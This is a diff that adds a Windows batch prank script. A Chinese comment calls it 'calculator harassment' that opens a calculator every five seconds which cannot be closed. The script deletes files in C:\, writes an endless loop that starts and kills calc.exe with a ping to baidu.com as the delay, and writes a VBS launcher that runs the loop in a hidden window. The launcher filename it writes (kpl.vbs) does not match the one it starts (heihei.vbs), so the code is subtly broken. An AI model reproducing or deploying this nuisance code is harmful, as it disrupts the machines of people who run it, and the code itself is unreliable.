@@ -1,0 +1,16 @@
+11
+del /f /q "C:\heihei.vbs"
+del c:/kpl.vbs
+echo  ^:1 >> c:/heihei.bat
+echo start calc^.exe >> c:/heihei.bat
+echo ping^ www^.baidu^.com >>  c:/heihei.bat
+echo taskkill^ ^-f^ ^-im^ calc^.exe >> c:/heihei.bat
+echo ping^ www^.baidu^.com >>  c:/heihei.bat
+echo goto^ 1 >>  c:/heihei.bat
+echo CreateObject^(^"WScript^.Shell^"^)^.Run^ ^"cmd^ ^/c^ C^:^/heihei^.bat^"^,0^ >> c:/kpl.vbs
+start c:/heihei.vbs
+exit
+
+
+
+//计算器骚扰 5秒钟打开一个计算器 还关不掉
